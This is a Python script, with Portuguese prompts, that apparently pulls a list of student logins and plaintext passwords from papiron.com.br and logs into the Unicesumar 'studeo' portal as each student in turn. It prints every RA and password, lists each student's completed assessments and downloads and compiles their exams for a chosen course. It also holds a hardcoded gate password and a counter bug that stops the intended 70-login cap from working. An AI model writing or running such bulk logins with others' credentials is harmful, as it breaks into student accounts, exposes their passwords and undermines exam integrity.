import sys
import os
import requests

# Inicia sessão HTTP
session = requests.Session()

# Se os módulos estiverem em outra pasta, descomente e ajuste o caminho abaixo:
# sys.path.append(os.path.abspath(".."))

from system.requests_unicesumar import (
    login,
    gerar_enconding,
    imprimir_prova,
    listar_provas_disponíveis,
    compilador_arquivos,
)

import requests
import urllib.parse
def main():
    senha = input(f"Digite senha, se errar fudeu!:")

    if senha == "893456Zx":
        pass
    else:
        import winsound
        print(" >>> AVISEI PARA NÃO ERRAR A SENHA!!!")
        winsound.Beep(9500,12000)  
        print(" >>> Logo para kkkkkkkkkkkkkkkkkkkkk!!!")  
        sys.exit()

    
    disciplina = input("  >> Informe a disciplina: ")
    ano_inicio = input("  >> Ano Inicial (pressione Enter para ignorar): ")
    ano_fim = input("  >> Ano Final (pressione Enter para ignorar): ")

    # Monta os parâmetros de forma segura (urlencode trata espaços e acentos)
    params = {
        "disciplina": disciplina
    }

    if ano_inicio.strip():
        params["ano_inicio"] = ano_inicio.strip()

    if ano_fim.strip():
        params["ano_fim"] = ano_fim.strip()

    query_string = urllib.parse.urlencode(params)

    print(query_string)

    url = f"https://www.papiron.com.br/alunos/baixar-alunos-ras/?{query_string}"
    req = requests.get(url)
    ras_total = req.json()

    ras = dict(list(ras_total.items()))
    if len(ras_total) == len(ras):
        print(f"\n    >>  Foram encontrados: {len(ras)} logins\n\n")
    else:
        print(f"\n    >>  Foram encontrados: {len(ras_total)} logins, mas foram limitados a 70\n\n")
    import time
    time.sleep(8)

    n = 0
    for r in ras:

        if n>70:
            break
        
        ra = r
        senha = ras[ra]["Senha"]
        print(ra, senha)
        try:
            headers = login(ra=ra, senha=senha)
            token = headers["Authorization"]

            listar_provas_disponíveis(headers=headers)

            url_encerradas = (
            "https://studeoapi.unicesumar.edu.br/agendamento-api-controller/api/avaliacao-encerrada/busca-lista-encerrada-web/?page=0"
        )

            headers["Host"] = "studeoapi.unicesumar.edu.br"

            response = session.get(url_encerradas, headers=headers)
            response.raise_for_status()

            dados = response.json()

            avaliacoes_realizadas = [
                item for item in dados if item.get("dsStatus") == "Avaliação Realizada"
            ]

            n=+1

            for av in avaliacoes_realizadas:
                disciplina_portal = av["nmDisciplina"]
                id_questao = av["idQuestionarioAluno"]
                print(disciplina_portal)

                if disciplina_portal == disciplina:
                    print(f"\n  >> Baixar {disciplina}")

                    encoding = gerar_enconding(
                        ra=ra, id_questao=id_questao, token=token
                    )
                    imprimir_prova(
                        encoding=encoding, disciplina=disciplina_portal, id=id_questao
                    )
            
        except Exception as err:
            print(f"Erro para RA {ra}: {err}")
            continue

    compilador_arquivos(disciplina, True)

if __name__ == "__main__":
    main()
